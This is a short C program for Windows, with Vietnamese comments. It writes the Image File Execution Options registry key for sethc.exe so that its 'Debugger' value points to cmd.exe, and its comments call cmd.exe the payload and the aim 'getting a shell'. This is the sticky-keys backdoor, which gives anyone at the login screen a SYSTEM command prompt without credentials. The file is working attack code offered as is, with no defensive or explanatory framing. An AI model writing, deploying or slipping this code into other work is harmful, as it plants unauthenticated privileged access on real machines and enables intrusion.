#include <windows.h>
#include <stdio.h>

int main() {
    HKEY hKey;
    LSTATUS status;

    // 1. Tạo sethc.exe nếu chưa có
    const char* subKey = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe";

    // 2. Lấy Shell bằng cmd.exe
    const char* payload = "C:\\Windows\\System32\\cmd.exe";

    // 3. Tạo/Mở Key trong HKLM
    status = RegCreateKeyExA(
        HKEY_LOCAL_MACHINE,
        subKey,
        0,
        NULL,
        REG_OPTION_NON_VOLATILE,
        KEY_WRITE,
        NULL,
        &hKey,
        NULL
    );

    if (status != ERROR_SUCCESS) {
        return 1;
    }

    // 4. Gán giá trị "Debugger" trỏ về cmd.exe
    status = RegSetValueExA(
        hKey,
        "Debugger",
        0,
        REG_SZ,
        (const BYTE*)payload,
        strlen(payload) + 1
    );

    RegCloseKey(hKey);
    return 0;
}